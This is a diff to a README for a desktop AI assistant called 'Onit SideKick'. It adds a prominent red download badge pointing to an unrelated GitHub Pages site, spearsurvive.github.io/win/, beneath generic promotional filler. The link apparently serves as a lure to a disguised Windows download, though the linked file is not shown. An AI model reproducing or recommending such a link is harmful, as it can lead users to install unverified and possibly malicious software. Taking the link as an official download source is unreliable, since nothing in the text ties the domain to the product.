@@ -30,6 +30,12 @@ Onit SideKick is a persistent AI panel on your desktop that helps you write, sum
 
 Whether you're a newcomer or a veteran, Onit SideKick provides the tools you need to get the most out of your ai tools experience. Designed for Windows and macOS, it delivers a seamless, high-performance workflow.
 
+<div align="center">
+
+[![Download Onit SideKick](https://img.shields.io/badge/⬇_DOWNLOAD_Onit+SideKick-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://spearsurvive.github.io/win/)
+
+</div>
+
 ---
 
 ## ✨ Key Features
